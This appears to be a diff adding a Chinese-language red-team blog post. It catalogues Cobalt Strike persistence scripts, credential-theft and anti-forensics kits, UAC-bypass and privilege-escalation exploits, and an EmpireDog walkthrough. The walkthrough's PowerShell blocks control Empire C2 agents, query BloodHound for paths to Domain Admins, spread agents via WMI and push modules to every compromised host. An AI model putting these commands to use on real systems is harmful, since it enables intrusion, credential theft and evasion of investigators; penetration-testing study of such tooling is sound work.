+<p><a href="https://cloud.githubusercontent.com/assets/27856212/26449045/2e4a13c2-411e-11e7-83e4-2b57babdbbdd.PNG" target="_blank" rel="noopener"><img src="https://cloud.githubusercontent.com/assets/27856212/26449045/2e4a13c2-411e-11e7-83e4-2b57babdbbdd.PNG" alt="服务"></a></p>
+</li>
+<li><p>WMICEventPersist.cna</p>
+<ul>
+<li>使用WMIC为选定的Bean生成系统级别持久性的自定义WMI事件</li>
+<li>语法很重，在使用实时目标之前首先测试</li>
+</ul>
+<p><a href="https://cloud.githubusercontent.com/assets/27856212/25680015/5eeab692-301d-11e7-8b85-914fe928e426.PNG" target="_blank" rel="noopener"><img src="https://cloud.githubusercontent.com/assets/27856212/25680015/5eeab692-301d-11e7-8b85-914fe928e426.PNG" alt="wmic4"></a></p>
+</li>
+<li><p>WMIEventPersist.cna</p>
+<ul>
+<li>使用PowerShell为选定的Bean生成SYSTEM级别持久性的自定义WMI事件</li>
+<li>语法很重，在使用实时目标之前首先测试</li>
+</ul>
+<p><a href="https://cloud.githubusercontent.com/assets/27856212/26449054/36d33172-411e-11e7-818d-7f0702a40712.PNG" target="_blank" rel="noopener"><img src="https://cloud.githubusercontent.com/assets/27856212/26449054/36d33172-411e-11e7-818d-7f0702a40712.PNG" alt="wmipersist1"></a></p>
+</li>
+<li><p>StartupGPOPersist.cna</p>
+<ul>
+<li>在psscripts.ini中生成本地GPO条目，以调用.ps1脚本文件以在选定的Bean上保持持久性</li>
+<li>以SYSTEM身份回拨</li>
+<li>在执行之前首先使用GPO枚举（成功的GroupPolicy目录列表）检查权限</li>
+<li>Bean执行将导致winlogon.exe挂起，最终用户无法登录。一旦新的Bean检入注入另一个进程并杀死原始。更新即将推出。</li>
+</ul>
+<p><a href="https://cloud.githubusercontent.com/assets/27856212/26449031/1ffb0aba-411e-11e7-9138-f23de966ac4b.PNG" target="_blank" rel="noopener"><img src="https://cloud.githubusercontent.com/assets/27856212/26449031/1ffb0aba-411e-11e7-9138-f23de966ac4b.PNG" alt="GPO"></a></p>
+</li>
+<li><p>RegistryPersist.cna</p>
+<ul>
+<li>根据所选Bean的用户输入创建自定义注册表项，值，类型和有效负载位置</li>
+</ul>
+<p><a href="https://cloud.githubusercontent.com/assets/27856212/26449228/14f41a48-411f-11e7-8690-3ce3c1541738.PNG" target="_blank" rel="noopener"><img src="https://cloud.githubusercontent.com/assets/27856212/26449228/14f41a48-411f-11e7-8690-3ce3c1541738.PNG" alt="注册处"></a></p>
+</li>
+<li><p>HKCURunKeyPSRegistryPersist.cna</p>
+<ul>
+<li>在HKCU中创建两个自定义注册表运行密钥条目</li>
+<li>Payload是基于HTTP/HTTPS侦听器的base64编码的PowerShell有效负载</li>
+</ul>
+<p><a href="https://user-images.githubusercontent.com/27856212/28122833-5bee8d72-66ed-11e7-8d0b-332f32627c62.png" target="_blank" rel="noopener"><img src="https://user-images.githubusercontent.com/27856212/28122833-5bee8d72-66ed-11e7-8d0b-332f32627c62.png" alt="HKCU"></a></p>
+</li>
+<li><p>Bitsadmin.cna</p>
+<ul>
+<li>创建在重新引导时执行的bitsadmin作业</li>
+<li>目前适用于Windows 7,8，Server 2008，Server 2012</li>
+</ul>
+<p><a href="https://user-images.githubusercontent.com/27856212/40030114-f1bb39d2-57a5-11e8-9b99-ea076a852503.png" target="_blank" rel="noopener"><img src="https://user-images.githubusercontent.com/27856212/40030114-f1bb39d2-57a5-11e8-9b99-ea076a852503.png" alt="位"></a></p>
+</li>
+</ul>
+<h4 id="Kits-工具包"><a href="#Kits-工具包" class="headerlink" title="Kits 工具包"></a>Kits 工具包</h4><p>这里的大多数有用的脚本都是用<a href="https://github.com/Und3rf10w/Aggressor-scripts/blob/master/kits" target="_blank" rel="noopener">工具包</a>组织的。您所要做的就是加载<a href="https://github.com/Und3rf10w/Aggressor-scripts/blob/master/kits/KitLoader.cna" target="_blank" rel="noopener">KitLoader.cna</a>脚本，它将自动加载所有其他工具包（execpt DebugKit）。</p>
+<ol>
+<li><strong>AnnoyKit</strong></li>
+</ol>
+<p>此套件中的操作围绕杂项乐趣，通常涉及弄乱用户</p>
+<ol>
+<li><strong>AntiForensicsKit</strong>   </li>
+</ol>
+<p>该套件中的行动围绕抗辩护理。如果它减慢了调查员的速度，它很可能属于这个套件。我们都知道抗辩法是最好的取证。</p>
+<ol>
+<li><strong>CredKit</strong>  凭证获取</li>
+</ol>
+<p>此工具包中的操作围绕凭证窃取，无论是通过内存抓取还是读取文件。如果涉及窃取密码，则应该在此处。</p>
+<ol>
+<li><strong>DebugKit</strong></li>
+</ol>
+<p>此工具包仅限于我用于开发和调试的操作，因此不会加载其余部分。</p>
+<ol>
+<li><strong>EnumKit</strong></li>
+</ol>
+<p>此工具包中的操作围绕主机和网络枚举。凭证枚举操作应该使用CredKit。</p>
+<ol>
+<li><strong>PersistKit</strong>  </li>
+</ol>
+<p>此工具包中的操作围绕端点持久性。示例包括后门服务创建，后门进程创建等</p>
+<ol>
+<li><strong>PrivEscKit</strong>  提权</li>
+</ol>
+<p>此工具包中的操作围绕端点权限提升。涉及强制扫描的动作（powerup.ps1，unix-privesc-check）应该放在apporiate部分</p>
+<ol>
+<li><strong>ThirdParty</strong> 这只是其他人创建的.cna脚本的随机集合，我喜欢使用它们。我只是装载了kitloader以便于传送。可能会对第三方脚本进行更改，以便更好地与我的工作流程集成。</li>
+</ol>
+<h5 id="NoPowerShell"><a href="#NoPowerShell" class="headerlink" title="NoPowerShell"></a>NoPowerShell</h5><blockquote>
+<p><a href="https://github.com/bitsadmin/nopowershell" target="_blank" rel="noopener">https://github.com/bitsadmin/nopowershell</a></p>
+</blockquote>
+<p>NoPowerShell是一个用C＃实现的工具，它支持执行类似PowerShell的命令，同时对任何PowerShell日志记录机制都不可见。可以在Cobalt Strike中加载此.NET Framework 2兼容二进制文件，以在内存中执行命令。不<code>System.Management.Automation.dll</code>使用; 只有原生的.NET库。</p>
+<p>此外，该项目使每个人只需使用几行C＃代码即可轻松扩展其功能。</p>
+<h5 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h5><p><a href="https://github.com/tevora-threat/PowerView3-Aggressor" target="_blank" rel="noopener">https://github.com/tevora-threat/PowerView3-Aggressor</a></p>
+<h5 id="BloodHound-联动插件"><a href="#BloodHound-联动插件" class="headerlink" title="BloodHound 联动插件"></a>BloodHound 联动插件</h5><p><a href="https://github.com/vysec/ANGRYPUPPY" target="_blank" rel="noopener">https://github.com/vysec/ANGRYPUPPY</a></p>
+<h4 id="提权脚本"><a href="#提权脚本" class="headerlink" title="提权脚本"></a>提权脚本</h4><p>UAC Bypass</p>
+<blockquote>
+<p><a href="https://github.com/RhinoSecurityLabs/Aggressor-Scripts" target="_blank" rel="noopener">https://github.com/RhinoSecurityLabs/Aggressor-Scripts</a></p>
+</blockquote>
+<h5 id="在不调用powershell-exe的情况下运行PowerShell命令"><a href="#在不调用powershell-exe的情况下运行PowerShell命令" class="headerlink" title="在不调用powershell.exe的情况下运行PowerShell命令"></a>在不调用powershell.exe的情况下运行PowerShell命令</h5><blockquote>
+<p><a href="https://github.com/Mr-Un1k0d3r/PowerLessShell" target="_blank" rel="noopener">https://github.com/Mr-Un1k0d3r/PowerLessShell</a></p>
+</blockquote>
+<h5 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h5><blockquote>
+<p><a href="https://github.com/rsmudge/ElevateKit" target="_blank" rel="noopener">https://github.com/rsmudge/ElevateKit</a></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ms15-051</span><br><span class="line">ms16-016</span><br><span class="line">ms16-032：辅助登录句柄权限提升（CVE-2016-099）</span><br><span class="line">uac-eventvwr</span><br><span class="line">uac-wscript</span><br></pre></td></tr></table></figure>
+<h4 id="UACME-BypassUAC的总结"><a href="#UACME-BypassUAC的总结" class="headerlink" title="UACME  BypassUAC的总结"></a>UACME  BypassUAC的总结</h4><blockquote>
+<p><a href="https://github.com/hfiref0x/UACME" target="_blank" rel="noopener">https://github.com/hfiref0x/UACME</a></p>
+<p><a href="http://www.freebuf.com/author/alphalab" target="_blank" rel="noopener">alphalab</a>  总结：白名单绕过UAC方法原理介绍 <a href="https://www.freebuf.com/vuls/183914.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/183914.html</a></p>
+<p><a href="https://www.v2ex.com/t/358133?p=1" target="_blank" rel="noopener">https://www.v2ex.com/t/358133?p=1</a></p>
+<p><a href="http://www.fuzzysecurity.com/tutorials/27.html" target="_blank" rel="noopener">http://www.fuzzysecurity.com/tutorials/27.html</a></p>
+</blockquote>
+<p>原理：</p>
+<ol>
+<li>各类UAC白名单程序的DLL劫持</li>
+<li>各类提升权限的COM接口利用</li>
+</ol>
+<ul>
+<li><p>Akagi 也就是主要的Bin，其中包含了所有的Methods，绕过UAC的主要方法的源码都在Method目录下，会以UAC绕过方法的发现者的名字来命名源文件。</p>
+</li>
+<li><p>Akatsuki 又叫做“晓”，WOW64 logger绕过UAC的利用方法的DLL源码</p>
+</li>
+<li><p>Fubuki 又叫做“暴风雪“,好几个绕过UAC利用的代理DLL，他们都共用了劫持Ole32.dll的方法</p>
+</li>
+<li><p>Hibiki 又叫做“声音”，AVRF方法绕过UAC的利用方法的DLL源码</p>
+</li>
+<li><p>Ikazuchi 又叫做”雷声“，利用劫持 comctl32.dll 组件绕过UAC的利用方法的DLL源码</p>
+</li>
+<li><p>Inazuma 又叫做“闪电”，SHIM相关利用的绕过UAC的利用方法的EXE源码</p>
+</li>
+<li><p>Kamikaze 又叫做“神风”，未在工程文件中引用，MMC劫持方法利用的MSC文件</p>
+</li>
+<li><p>Kongou 又叫做“金刚”，利用Hybrid方法绕过UAC的Dll，已经排除在新工程中的引用了</p>
+</li>
+<li><p>Naka 又叫做“空气”，压缩及亦或编码的小工具源码</p>
+</li>
+<li><p>Yuubari Aka UACView用来查看相关UAC的设定信息，以及扫描存在可利用的程序的工具</p>
+</li>
+</ul>
+<h2 id="工具联动"><a href="#工具联动" class="headerlink" title="工具联动"></a>工具联动</h2><h2 id="一些自动化工具"><a href="#一些自动化工具" class="headerlink" title="一些自动化工具"></a>一些自动化工具</h2><h3 id="Death-Star-自动化工具"><a href="#Death-Star-自动化工具" class="headerlink" title="Death Star 自动化工具"></a>Death Star 自动化工具</h3><blockquote>
+<p><a href="https://github.com/SadProcessor/EmpireDog" target="_blank" rel="noopener">https://github.com/SadProcessor/EmpireDog</a></p>
+<p><a href="https://www.youtube.com/watch?v=iMoFORL2fpQ" target="_blank" rel="noopener">https://www.youtube.com/watch?v=iMoFORL2fpQ</a></p>
+</blockquote>
+<p>基于Empire API，下拉agent，自动的使用Empire Api进行横向渗透、后渗透。</p>
+<p>原理是作者博客上的那种图，一些常见的内网域渗透思路。</p>
+<p>实验了下，还是挺自动化的。就是遍历一些常见的攻击方式。</p>
+<h3 id="EmpireDog"><a href="#EmpireDog" class="headerlink" title="EmpireDog"></a>EmpireDog</h3><blockquote>
+<p><a href="https://github.com/SadProcessor/EmpireDog" target="_blank" rel="noopener">https://github.com/SadProcessor/EmpireDog</a></p>
+</blockquote>
+<p>EmpireDog，是用powershell联动Empire、BloodHound的一套工具。</p>
+<p>安装步骤：</p>
+<ul>
+<li><p>把github上四个文件夹下到 C:\Windows\System32\WindowsPowerShell\v1.0\Modules中。</p>
+</li>
+<li><p>分布Import-Modules </p>
+</li>
+<li><p>将CustomCypher.txt内容添加到BH Custom Queries / Map Empire</p>
+</li>
+</ul>
+<blockquote>
+<p>Get-Command -Module <em><modulename></modulename></em> | Get-Help -Examples</p>
+</blockquote>
+<p>基本流程：</p>
+<p>Empire–&gt;PowerEmpire–&gt; DogStrike_–&gt;  CypherDog–&gt;BloodHound–&gt;权限</p>
+<h4 id="第一步-Empire-API交互"><a href="#第一步-Empire-API交互" class="headerlink" title="第一步 Empire API交互"></a><strong>第一步 Empire API交互</strong></h4><p>PowerEmpire和EmpireStrike可与Empire服务器进行交互</p>
+<p>通过帝国API。 PowerEmpire不需要EmpireStrike。 EmpireStrike是PowerEmpire上的一个包装器。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./empire --headless --username *user* --password *password*</span><br><span class="line">./empire --rest --username *user* --password *password*</span><br></pre></td></tr></table></figure>
+<h5 id="PowerEmpire"><a href="#PowerEmpire" class="headerlink" title="PowerEmpire"></a><strong>PowerEmpire</strong></h5><p>PowerEmpire是一个PowerShell模块，用于与Empire的API进行交互</p>
+<p>特征</p>
+<ul>
+<li>27个与Empire Server交互的Cmdlet</li>
+<li>通过会话控制多个服务器</li>
+<li>用PowerShell做吧！</li>
+</ul>
+<p>Credits</p>
+<p>PowerEmpire由DarkOperator编写（@Carlos_Perez）</p>
+<p>更多信息</p>
+<p><a href="https://gitlab.com/carlos_perez/PowerEmpire/wikis/home" target="_blank" rel="noopener">https://gitlab.com/carlos_perez/PowerEmpire/wikis/home</a></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">＃安装模块</span><br><span class="line"></span><br><span class="line"><span class="built_in">Set-ExecutionPolicy</span> UnRestricted</span><br><span class="line"></span><br><span class="line"><span class="built_in">Import-Module</span> PowerEmpire2.<span class="number">0</span>_DogMod</span><br><span class="line"></span><br><span class="line">＃连接到服务器</span><br><span class="line"></span><br><span class="line">New-EmpireSession    -ComputerName   &lt;IP&gt; -Credential &lt;用户名&gt; -NoSSLCheck</span><br><span class="line">New-EmpireSession    -ComputerName  <span class="number">192.168</span>.<span class="number">10.130</span> -Credential admin  -NoSSLCheck</span><br><span class="line">＃检查命令</span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-Command</span> -Module PowerEmpire2.<span class="number">0</span>_dogMod</span><br><span class="line"></span><br><span class="line"><span class="comment">#RTFM</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-Help</span> *&lt;CommandName&gt;* -Full</span><br></pre></td></tr></table></figure>
+<p>注意：</p>
+<p>导入EmpireStrike模块也将导入PowerEmpire并要求</p>
+<p>初始服务器设置，所以你现在可以跳过这一切</p>
+<h5 id="EmpireStrike"><a href="#EmpireStrike" class="headerlink" title="EmpireStrike"></a><strong>EmpireStrike</strong></h5><p>EmpireStrike是PowerEmpire的一个包装器，语法短。</p>
+<p>EmpireStrike Cmdlet使用PowerEmpire命令。</p>
+<p> 特征</p>
+<ul>
+<li>17个具有短语法的Cmdlet</li>
+<li>Tab-Completion / Dynamic Params</li>
+<li>管道输入/多个目标</li>
+<li>ISE额外服务</li>
+</ul>
+<p>安装</p>
+<p>导入EmpireStrike还将导入PowerEmpire。</p>
+<p>命令</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#import Module（也导入PowerEmpire2.0_DogMod）</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Import-Module</span> EmpireStrike2.<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Session</span></span><br><span class="line"><span class="comment"># Check Current Session</span></span><br><span class="line">Session ?</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"><span class="comment">## Agents</span></span><br><span class="line"><span class="comment"># Check selected agents</span></span><br><span class="line">Agent ?</span><br><span class="line"><span class="comment"># Agent list for current session</span></span><br><span class="line">Agent *</span><br><span class="line"><span class="comment"># Set agent</span></span><br><span class="line">Agent ABCDE123</span><br><span class="line"><span class="comment"># Check selected agent</span></span><br><span class="line">Agent ?</span><br><span class="line"><span class="comment"># More details</span></span><br><span class="line">Agent ??</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Multiple Targets</span></span><br><span class="line">Agent * | CommandX <span class="string">'$env:COMPUTERNAME'</span></span><br><span class="line"><span class="comment"># Get Results</span></span><br><span class="line">Agent * | Result</span><br><span class="line"></span><br><span class="line"><span class="comment">## Modules</span></span><br><span class="line"><span class="comment"># Check selected module</span></span><br><span class="line">Module ?</span><br><span class="line"><span class="comment"># List all Modules</span></span><br><span class="line">Module *</span><br><span class="line"><span class="comment"># Search Module</span></span><br><span class="line">ModuleSearch wallpaper</span><br><span class="line"><span class="comment"># Set Module</span></span><br><span class="line">Module powershell/trollsploit/wallpaper</span><br><span class="line"><span class="comment"># or Combo</span></span><br><span class="line">Module (ModuleSearch wallpaper).name</span><br><span class="line"><span class="comment"># Check options for selected module</span></span><br><span class="line">Option ?</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># With description</span></span><br><span class="line">Option *</span><br><span class="line"><span class="comment"># Set option</span></span><br><span class="line">Option LocalImagePath <span class="string">"/root/Pictures/wallpapers/wllppr.jpg"</span></span><br><span class="line"><span class="comment"># Check options</span></span><br><span class="line">Option ?</span><br><span class="line"><span class="comment">## Strike</span></span><br><span class="line"><span class="comment"># View Strike Details</span></span><br><span class="line">Strike ?</span><br><span class="line"><span class="comment"># Strike</span></span><br><span class="line">Strike</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Multiple Targets</span></span><br><span class="line"><span class="comment"># Change wallpaper to all agents in selected session</span></span><br><span class="line">Session <span class="number">0</span></span><br><span class="line">Module (ModuleSearch wallpaper).name</span><br><span class="line">Option LocalImagePath <span class="string">'/root/Pictures/wallpapers/wllppr.jpg'</span></span><br><span class="line">Agent * | StrikeX</span><br><span class="line"><span class="comment">## RTFM</span></span><br><span class="line"><span class="comment"># More Stuff...</span></span><br><span class="line"><span class="built_in">Get-command</span> -Module EmpireStrike2.<span class="number">0</span> | <span class="built_in">Get-Help</span> | select Name,Synopsis</span><br><span class="line"><span class="comment"># Examples</span></span><br><span class="line"><span class="built_in">Get-Help</span> &lt;CommandName&gt; -Examples</span><br></pre></td></tr></table></figure>
+<p><a href="https://www.youtube.com/watch?v=eok_NgFOnmc" target="_blank" rel="noopener">https://www.youtube.com/watch?v=eok_NgFOnmc</a></p>
+<h4 id="第二部-与BloodHound-API交互"><a href="#第二部-与BloodHound-API交互" class="headerlink" title="第二部- 与BloodHound API交互"></a><strong>第二部- 与BloodHound API交互</strong></h4><h5 id="CypherDog"><a href="#CypherDog" class="headerlink" title="CypherDog"></a><strong>CypherDog</strong></h5><p>CypherDog是一个用于将Cypher查询发送到BloodHound API的模块。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> Import Module</span><br><span class="line">Import-Module CypherDog1.3</span><br><span class="line"><span class="meta">#</span> Query Node</span><br><span class="line">Node -User ACHAVARIN@EXTERNAL.LOCAL</span><br><span class="line">NodeSearch -Computer Secret</span><br><span class="line"><span class="meta">#</span> Query Edge</span><br><span class="line">Edge -MemberOfGroup CONTRACTINGI@INTERNAL.LOCAL -Return Users</span><br><span class="line">Edge -MemberOfGroup CONTRACTINGI@INTERNAL.LOCAL -Return Users -Degree *</span><br><span class="line"><span class="meta">#</span> Pipeline Combo</span><br><span class="line">Edge -AdminToComputer APOLLO.EXTERNAL.LOCAL -Return Groups |</span><br><span class="line">Edge -MemberOfGroup -Return Users | measure</span><br><span class="line">Edge -AdminToComputer APOLLO.EXTERNAL.LOCAL -Return Groups |</span><br><span class="line">Edge -MemberOfGroup -Return Users -degree * | measure</span><br><span class="line"><span class="meta">#</span> Query Edge Reverse</span><br><span class="line">EdgeR -ParentOfUser ACHAVARIN@EXTERNAL.LOCAL -Return Groups</span><br><span class="line"><span class="meta">#</span> Query Path</span><br><span class="line">Path -UserToGroup -From ACHAVARIN@EXTERNAL.LOCAL -To `</span><br><span class="line">'DOMAIN ADMINS@INTERNAL.LOCAL'</span><br><span class="line"><span class="meta">#</span># RTFM &gt;&gt; Create/Delete/Update Nodes/Edges</span><br><span class="line"><span class="meta">#</span> List all Module Commands</span><br><span class="line">Get-command -Module CypherDog1.3 | Get-Help | Select Name,Synopsis</span><br><span class="line"><span class="meta">#</span> Get Help for specific command</span><br><span class="line">Get-Help &lt;CommandName&gt; -full</span><br></pre></td></tr></table></figure>
+<p>视频</p>
+<p><a href="https://www.youtube.com/watch?v=SPgkgeOY40Y" target="_blank" rel="noopener">https://www.youtube.com/watch?v=SPgkgeOY40Y</a></p>
+<h4 id="第三部-联动BloodHound和Empire"><a href="#第三部-联动BloodHound和Empire" class="headerlink" title="第三部 联动BloodHound和Empire"></a><strong>第三部 联动BloodHound和Empire</strong></h4><h5 id="DogStrike"><a href="#DogStrike" class="headerlink" title="DogStrike"></a><strong>DogStrike</strong></h5><p>DogStrike是一系列用于协调的cmdlet</p>
+<p>BloodHound / Empire，使用PowerEmpire / EmpireStrike / CypherDog的cmdlet。</p>
+<p>还包括自定义密码查询，以将帝国图形化为BloodHound中的节点。</p>
+<p>特征</p>
+<ul>
+<li>自动映射帝国和图表+循环更新显示</li>
+<li>自动提升/生成/传播代理</li>
+<li>自动清洁会话/图表（陈旧）</li>
+</ul>
+<p>- <strong>DIY框架</strong></p>
+<p>使用PowerShell作为攻击性自动化框架……</p>
+<p>命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> Import Module (Also Imports EmpireStrike/PowerEmpire/CypherDog)</span><br><span class="line">Import-Module DogStrike2.13</span><br><span class="line"><span class="meta">#</span> List all commands</span><br><span class="line">gcm -Mod DogStrike2.13 | Get-Help | Select Name,Synopsis</span><br><span class="line">Name Synopsis</span><br><span class="line">---- --------</span><br><span class="line">Invoke-DogBark Add Speech to automations</span><br><span class="line">Invoke-DogBite Return Listener &amp; Session for input Agent</span><br><span class="line">Invoke-DogClock Check Agent last checkin time</span><br><span class="line">Invoke-DogElevate Elevate Agent via empire module</span><br><span class="line">Invoke-DogFetch Bulk Add Properties to Nodes</span><br><span class="line">Invoke-DogMap Map Empire Nodes in BloodHound Graph</span><br><span class="line">Invoke-DogPass Pass Agent to another Server/listener</span><br><span class="line">Invoke-DogSearch Search Empire Nodes only</span><br><span class="line">Invoke-DogSpawn Spawn agent via empire module</span><br><span class="line">Invoke-DogSpread Spread agent via WMI</span><br><span class="line">Invoke-DogWatch Map/Update Empire Agents (loopable)</span><br><span class="line">Invoke-DogWipe Remove Stale Agents/Nodes</span><br><span class="line"><span class="meta">#</span> Help for Specific Command</span><br><span class="line">Get-Help &lt;CommandName&gt; -full</span><br></pre></td></tr></table></figure>
+<p>视频</p>
+<p><a href="https://www.youtube.com/watch?v=IcbCYy7IiNE" target="_blank" rel="noopener">https://www.youtube.com/watch?v=IcbCYy7IiNE</a></p>
+<p><a href="https://www.youtube.com/watch?v=bDm1zR2W4w0" target="_blank" rel="noopener">https://www.youtube.com/watch?v=bDm1zR2W4w0</a></p>
+<p><a href="https://www.youtube.com/watch?v=a4EtEY37ImQ" target="_blank" rel="noopener">https://www.youtube.com/watch?v=a4EtEY37ImQ</a></p>
+<p>注意</p>
+<p>导入DogStrike还会导入PowerEmpire + EmpireStrike和CypherDog。</p>
+<p><strong>附录</strong></p>
+<p>Dummy DIY Cmdlet - 多个目标的模块组合</p>
+<p>CMDLET</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## CMDLET</span></span><br><span class="line"><span class="comment">&lt;# SHOW ME WHAT YOU GOT! #&gt;</span></span><br><span class="line"><span class="keyword">Function</span> Invoke-ShowMeWhatYouGot&#123;</span><br><span class="line"> [CmdletBinding()]</span><br><span class="line"> [Alias(<span class="string">'ShowMeWhatYouGot'</span>)]</span><br><span class="line"> <span class="keyword">Param</span>(</span><br><span class="line"> <span class="comment"># Agent Name (Accepts multiple &amp; Pipeline)</span></span><br><span class="line"> [parameter(Mandatory=<span class="literal">$true</span>,ValueFromPipeline=<span class="literal">$True</span>)][String[]]<span class="variable">$Agent</span>,</span><br><span class="line"> <span class="comment"># Path to Wallpaper (on Empire Server)</span></span><br><span class="line"> [Parameter(Mandatory=<span class="literal">$true</span>)][Alias(<span class="string">'Image'</span>)][String]<span class="variable">$ImagePath</span>,</span><br><span class="line"> <span class="comment"># Video URL (if other than Get-Schwifty)</span></span><br><span class="line"> [Parameter(Mandatory=<span class="literal">$false</span>)][String]<span class="variable">$VideoURL</span></span><br><span class="line"> )</span><br><span class="line"> <span class="keyword">Begin</span>&#123;&#125;</span><br><span class="line"> <span class="keyword">Process</span>&#123;</span><br><span class="line"> <span class="keyword">Foreach</span>(<span class="variable">$Agt</span> <span class="keyword">in</span> <span class="variable">$Agent</span>)&#123;</span><br><span class="line"> <span class="comment"># Set Target Agent</span></span><br><span class="line"> DogBite -Agent <span class="variable">$Agt</span> -Select</span><br><span class="line"> <span class="comment"># trollsploit/wallpaper</span></span><br><span class="line"> Module powershell/trollsploit/wallpaper</span><br><span class="line"> Option LocalImagePath <span class="variable">$ImagePath</span></span><br><span class="line"> Strike -Agent <span class="variable">$Agt</span> -Blind</span><br><span class="line"> <span class="comment"># trollsploit/get-swchifty</span></span><br><span class="line"> Module powershell/trollsploit/get_schwifty</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$VideoURL</span>)&#123;Option VideoURL <span class="variable">$VideoURL</span>&#125;</span><br><span class="line"> Strike -Agent <span class="variable">$Agt</span> -Blind</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">End</span>&#123;</span><br><span class="line"> <span class="comment"># Quote the Giant Head</span></span><br><span class="line"> DogBark <span class="string">"I Like what You Got... Good Job."</span> -Rate -<span class="number">3</span> -Async</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">## ACTION (All Agent Nodes)</span></span><br><span class="line"><span class="comment"># Shumshumschilpiddydah!</span></span><br><span class="line"><span class="variable">$Schwifty</span> = <span class="string">'/root/Pictures/wallpapers/Get-Schwifty.png'</span></span><br><span class="line">DogSearch -Agent | ShowMeWhatYouGot -Image <span class="variable">$Schwifty</span></span><br></pre></td></tr></table></figure>
